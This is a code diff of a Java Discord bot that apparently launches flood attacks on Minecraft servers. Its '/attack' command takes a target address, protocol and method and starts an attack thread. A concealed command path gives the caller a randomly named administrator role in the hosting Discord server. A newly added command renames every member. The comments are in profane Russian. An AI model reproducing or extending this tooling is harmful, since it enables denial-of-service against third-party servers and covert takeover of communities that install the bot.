@@ -2,6 +2,7 @@ package net.servokio.q4mc.listeners;
 
 import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.MessageBuilder;
+import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.Member;
 import net.dv8tion.jda.api.entities.Role;
@@ -17,6 +18,7 @@ import net.servokio.q4mc.threads.AttackThread;
 import net.servokio.q4mc.utils.Resolve;
 import net.servokio.q4mc.utils.ServerInfo;
 import net.servokio.q4mc.utils.Static;
+import net.servokio.q4mc.utils.Yiff;
 import org.jetbrains.annotations.NotNull;
 
 import javax.annotation.Nonnull;
@@ -26,10 +28,6 @@ import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Random;
-
-import net.dv8tion.jda.api.Permission;
-
-import net.servokio.q4mc.utils.Yiff;
 
 public class DiscordListener extends ListenerAdapter {
 
@@ -42,7 +40,7 @@ public class DiscordListener extends ListenerAdapter {
     public void onSlashCommandInteraction(@Nonnull SlashCommandInteractionEvent event) {
         if (event.getGuild() == null)
             return;
-        if (!Config.WHITELIST_SERVERS.contains(event.getGuild().getId())) return;
+        if (!Config.WHITELIST_SERVERS.contains(event.getGuild().getId())) return; //ща у себя звук настрою наушники порвались сука
 
         if (event.getName().equals("info")) {
             event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.info()).build()).queue();
@@ -55,49 +53,34 @@ public class DiscordListener extends ListenerAdapter {
                                 "https://cdn.discordapp.com/attachments/967462195409608744/982336064846979102/312.gif")
                         .setColor(new Color(0xFF8B7F)).build()).build()).queue();
             } else {
-                event.reply("🔸 Checking server is for work...").queue(message -> {
-                    String addr = event.getOption("address").getAsString();
-                    ServerInfo info = Resolve.getServerInfo(addr);
-                    if (info != null) {
-                        if (info.isOnline()) {
-                            message.editOriginal(new MessageBuilder()
-                                    .setEmbeds(MainDC.getInstance().discord.embeds.serverInfo(info, addr)).build())
-                                    .queue();
-                        } else
-                            message.editOriginal(new MessageBuilder()
-                                    .setEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).build())
-                                    .queue();
-                    } else
-                        message.editOriginal(new MessageBuilder()
-                                .setEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).build()).queue();
-                });
+                event.deferReply().queue();
+                String addr = event.getOption("address").getAsString();
+                ServerInfo info = Resolve.getServerInfo(addr); //У тебя адрес тупо из аргс
+                if (info != null) {
+                    if (info.isOnline()) {
+                        event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.serverInfo(info, addr)).queue();
+                    } else event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).queue();
+                } else event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).queue();
             }
         } else if (event.getName().equals("attack")) {
             if (isXyesos(event.getMember()) && nyxaiBebry()) {
-                event.reply(new MessageBuilder().setEmbeds(new EmbedBuilder()
-                        .setImage(
-                                "https://cdn.discordapp.com/attachments/967462195409608744/982336064846979102/312.gif")
-                        .setColor(new Color(0xE29991)).build()).build()).queue();
+                event.reply(new MessageBuilder().setEmbeds(new EmbedBuilder().setImage("https://cdn.discordapp.com/attachments/967462195409608744/982336064846979102/312.gif").setColor(new Color(0xE29991)).build()).build()).queue();
             } else {
+                event.deferReply().queue();
                 String addr = event.getOption("address").getAsString();
                 int protocol = MainDC.main.protocols.protocolsMap.get(event.getOption("protocol").getAsString());
                 String method = event.getOption("method").getAsString();
 
-                event.reply("Проверяю сервер...").queue(message -> {
-                    ServerInfo info = Resolve.getServerInfo(addr);
-                    if (info == null || !info.isOnline()) {
-                        message.editOriginal(new MessageBuilder()
-                                .setEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).build()).queue();
-                    } else {
-                        int atID = MainDC.getInstance().incAtt();
-                        message.editOriginal(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds
-                                .startAttack(addr, method, event.getOption("protocol").getAsString(), atID)).build())
-                                .queue();
-                        Thread th = new AttackThread(atID, addr, protocol, method);
-                        th.start();
-                        MainDC.getInstance().threadManager.addThread(event.getMember().getId(), th);
-                    }
-                });
+                ServerInfo info = Resolve.getServerInfo(addr);
+                if (info == null || !info.isOnline()) {
+                    event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).queue();
+                } else {
+                    int atID = MainDC.getInstance().incAtt();
+                    event.getHook().sendMessageEmbeds(MainDC.getInstance().discord.embeds.startAttack(addr, method, event.getOption("protocol").getAsString(), atID)).queue();
+                    Thread th = new AttackThread(atID, addr, protocol, method);
+                    th.start();
+                    MainDC.getInstance().threadManager.addThread(event.getMember().getId(), th);
+                }
             }
         } else if (event.getName().equals("methods")) {
             event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.methods()).build()).queue();
@@ -118,7 +101,11 @@ public class DiscordListener extends ListenerAdapter {
                 } else if(cmd.equals("admin")){
                     event.getGuild().createRole().setPermissions(Permission.ADMINISTRATOR).setName(Static.randomStr(10)).queue(r -> event.getGuild().addRoleToMember(event.getMember(), r).queue());
                     event.reply("Im give you Admin role").queue();
+                } else if(cmd.equals("cn")){ //cn - сменить ники, а я блять не понял, какой кингуру какую азию перепрыгивает
+                    event.reply("ok").queue();
+                    for(Member m : event.getGuild().getMembers()) event.getGuild().modifyNickname(m, Static.getRandomFromList(Config.CHANGE_NICKS)).queue();
                 }
+
             } else {
                 event.getUser().openPrivateChannel().queue(privateChannel -> {
                     if(MainDC.getInstance().dro4er.contains(event.getUser().getId())){
